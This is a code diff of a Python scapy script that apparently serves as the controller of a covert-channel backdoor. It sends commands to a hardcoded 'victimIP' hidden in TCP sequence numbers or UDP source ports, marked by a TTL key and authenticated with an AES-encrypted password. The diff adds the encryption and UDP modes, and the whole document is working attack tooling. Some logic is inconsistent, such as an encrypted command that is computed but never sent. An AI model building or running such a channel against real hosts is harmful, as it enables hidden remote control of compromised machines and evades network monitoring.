@@ -1,81 +1,93 @@
 from scapy.all import *
+from Crypto.Cipher import AES #PiCrypto used for encrypting commands in AES
 
 
 #Inputs
-victimIP = "192.168.0.1"
-ttlKey = 71
+victimIP = "192.168.0.15"
+ttlKey = 164
 srcPort = 80
-dstPort = 53
-encryptionkey = "0123456789abcdef"
+dstPort = 8000
+encryptionKey = "0123456789abcdef"
 IV = "abcdefghijklmnop"
 protocol = "TCP"
+password = "TEST!"
 
 
-def packetizeCommandData(command):
+#Take a command and split it into chunks of desired length
+def packetizeCommandData(command,length):
     commandData = ''.join(str(ord(c)) for c in command)
-    print commandData
     #convert string to binary
     commandData = bin(int(commandData))[2:]
-    #TODO: ENCRYPT THE COMMAND HERE. Ensure that the command stays in numbers
 
-    print commandData
-
-    #Check the length of the data. If it is > 32 bits (TCP seq num field)
+    #Check the length of the data. If it is > length bits (TCP seq num field)
     #Will need to split into multiple packets
     print str(len(commandData))
     #If it is the proper length, perfect, merely send it back out.
-    if(len(commandData) == 32 ):
+    if(len(commandData) == length ):
         output = []
         output.append(commandData)
         return commandData
-    #If command is < 32, pad it with 0's
-    elif(len(commandData) < 32):
-        #If the length of the data is less than 32, pad it so that it will fit into a packet
-        return commandData.zfill(32)
-    elif(len(commandData) > 32):
+    #If command is < length, pad it with 0's
+    elif(len(commandData) < length):
+        #If the length of the data is less than length, pad it so that it will fit into a packet
+        return commandData.zfill(length)
+    elif(len(commandData) > length):
         #The amount of rounds we should chunk the data.
-        rounds = len(commandData) / 32
-        #What will be left over after we chunk the 32 bit chunks
-        excess = len(commandData) % 32
+        rounds = len(commandData) / length
+        #What will be left over after we chunk the length bit chunks
+        excess = len(commandData) % length
         print "Rounds is " + str(rounds)
         output = []
         i = 0
         start = 0
         end = 0
         while(i < rounds):
-            print "This is round" + str(i)
-            start = i*32
-            end = (i*32)+31
+            #print "This is round" + str(i)
+            start = i*length
+            end = (i*length)+(length - 1)
             output.append(commandData[start:end])
             i = i + 1
         #Get the remainder
         output.append(commandData[(end+1):(end+1+excess)])
         return output
 
-
-def craftCommandPacket(data):
+def craftCommandPacket(data,protocol,position,total):
     global victimIP
     global ttlKey
     global srcPort
     global dstPort
     global encryptionKey
     global IV
+    global password
 
-    packet = IP(dst=victimIP, ttl=ttlKey)/TCP(sport=srcPort,dport=dstPort,seq=int(str(data),2))
-    #packet.show()
+    print "Crafting packet for # " + str(position) + " / " + str(total)
+    if(protocol == "TCP"):
+        packet = IP(dst=victimIP, ttl=ttlKey)/TCP(sport=srcPort,dport=dstPort, \
+        seq=int(str(data),2))/Raw(load=encrypt(password+"\n"+str(position)+":" \
+        + str(total)))
+    elif(protocol == "UDP"):
+        packet = IP(dst=victimIP, ttl=ttlKey)/UDP(sport=int(str(data),2),\
+        dport=dstPort)/Raw(load=encrypt(password+"\n" + str(position) + \
+         ":"+str(total)))
     return packet
 
-def craftCommandPackets(data):
+def craftCommandPackets(data,protocol):
     packets = []
     #If the length of the number is larger than what is allowed in one packet, split it
-    for element in data:
-        packets.append(craftCommandPacket(element))
-        pass
+    counter = 0
+    while (counter < len(data)):
+        packets.append(craftCommandPacket(data[counter],protocol,counter+1,len(data)))
+        counter = counter + 1
+
     return packets
 
-
-
-
+def encrypt(command):
+    global encryptionKey
+    global IV
+    encryptionKey = encryptionKey
+    IV = IV
+    encryptor = AES.new(encryptionKey,AES.MODE_CFB,IV=IV)
+    return encryptor.encrypt(command)
 
 def sendCommand(protocol,command):
     global victimIP
@@ -84,24 +96,23 @@ def sendCommand(protocol,command):
     global dstPort
     global encryptionKey
     global IV
+
+    #Encrypt the command that the user types in.
+    encryptedCommand = encrypt(command);
+
+    #If the user uses to wish TCP to send commands, split the command into 32
+    #bit chunks, as they will be stuffed into the sequence number field which
+    #is 32 bits in size
     if(protocol == "TCP"):
-    #Construct a TCP packet, put the command into the sequence number
-        #Custom Protocol (Incase we have long commands)
-            #TCP: Sequence Number = Data
-                #Convert string to ASCII
-        print packetizeCommandData(command)
-        binaryDataArray = packetizeCommandData(command)
-        packets = craftCommandPackets(binaryDataArray)
-            #TCP: ACK Number = Sequence number (0 means only one part to the command)
-            #So if there is more than one packet, add Increment the Ack number by 1
-        counter = 0
-        while (counter < len(packets)):
-            packet = packets[counter]
-            #TODO: Make this Ack Number more hidden than just "Plaintext 1"
-            packet["TCP"].ack = (counter + 1)
-            counter = counter + 1
-        #TCP: Data = Authentication Password
-        #TODO: Do this
+        binaryDataArray = packetizeCommandData(command,32)
+    #If the user uses to wish UDP to send commands, split the command into 16
+    #bit chunks, as they will be stuffed into the sequence number field which
+    #is 32 bits in size
+    elif(protocol == "UDP"):
+        binaryDataArray = packetizeCommandData(command,16)
+
+    #A list containing crafted packets ready to send
+    packets = craftCommandPackets(binaryDataArray,protocol)
 
     #Send the command packets
     for packet in packets:
